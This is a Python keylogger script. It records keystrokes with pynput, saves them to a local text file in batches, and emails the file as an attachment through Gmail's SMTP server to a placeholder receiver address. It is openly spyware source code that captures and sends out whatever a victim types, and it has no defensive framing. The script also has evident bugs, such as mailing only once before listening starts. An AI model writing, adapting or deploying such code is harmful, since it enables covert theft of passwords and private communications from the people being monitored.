from pynput import keyboard
import datetime

import base64
import os
import time
#For the mail part

import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
   
fromaddr = "<Enter sender email address>"
password='<enter sender password>'

toaddr = "<Enter reciver email address>"
events = []

keylogger = "keylogger.txt"


def on_press(key):
    global keylogger
    
    try:
     
      events.append(key)
      print(events)
    except AttributeError:
        print('{0}'.format(key))
    if len(events) == 20:
        file = open(keylogger, 'a')        
        for i in events:
            file.write(str(i))
        file.close()
        events.clear()
        


def on_handling():
    global events
    on_press()


#This is the part where the mail part starts

def mail():

    msg = MIMEMultipart()     
    msg['From'] =  fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "key report"
    
    
    body = str(datetime.datetime.now())
    
    msg.attach(MIMEText(body, 'plain'))  
    filename = "keylogger.txt"
    attachment = open("keylogger.txt", "rb") 
    p = MIMEBase('application', 'octet-stream') 
    p.set_payload((attachment).read()) 
    encoders.encode_base64(p)  
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)     
    msg.attach(p)  
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls() 
    s.login(fromaddr, password) 
    text = msg.as_string() 
    s.sendmail(fromaddr, toaddr, text) 
    s.quit() 
    file = open(keylogger, 'w')        
    file.write(' ')
    file.close()



mail()
with keyboard.Listener(on_press = on_press) as listener:
	listener.join()

on_handling()      

